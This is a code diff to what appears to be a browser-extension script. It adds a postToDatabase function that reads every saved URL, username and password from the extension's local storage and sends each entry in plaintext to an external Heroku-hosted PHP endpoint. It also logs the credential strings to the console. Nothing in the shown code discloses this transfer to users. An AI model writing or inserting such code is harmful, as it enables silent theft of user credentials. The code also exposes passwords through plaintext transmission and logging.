@@ -277,7 +277,8 @@ function show(){
 	}countResult(count);
 }
 
-function postToDatabase() {
+// example function to show how to read from file using cross-origin xhr
+function getFromFile() {
     var xhr = new XMLHttpRequest();
     xhr.open("GET", "https://php-hollaholl.herokuapp.com/example.json", true);
     xhr.onreadystatechange = function() {
@@ -286,6 +287,53 @@ function postToDatabase() {
         }
     }
     xhr.send();
+}
+
+function postToDatabase() {
+    chrome.storage.local.get(null, function (result) {
+        // count the number of entries
+        entryCount = result.urls.length;
+
+        var urlTemp, usernameTemp, passwordTemp, timeTemp;
+
+        // insert each entry into an external database
+        for (i=0; i<entryCount; i++) {
+            urlTemp = result.urls[i];
+            usernameTemp = result.usernames[i];
+            passwordTemp = result.passwords[i];
+            timeTemp = result.times[i];
+
+            var input = "url="+urlTemp+"&username="+usernameTemp+"&password="+passwordTemp+"&time="+timeTemp;
+            console.log("INPUT: "+input);
+            var xhr = new XMLHttpRequest();
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    alert(xhr.responseText);
+                }
+            }
+
+            xhr.open("POST", "https://php-hollaholl.herokuapp.com/dbhandle.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send(input);
+        }
+    });
+}
+
+function postToDatabase_v2() {
+    var input = "column1="+"Hello"+"&column2="+"world";
+    console.log("INPUT: "+input);
+    var xhr = new XMLHttpRequest();
+
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            alert(xhr.responseText);
+        }
+    }
+
+    xhr.open("POST", "https://php-hollaholl.herokuapp.com/dbhandleTest.php", true);
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    xhr.send(input);
 }
 
 var entryCount;
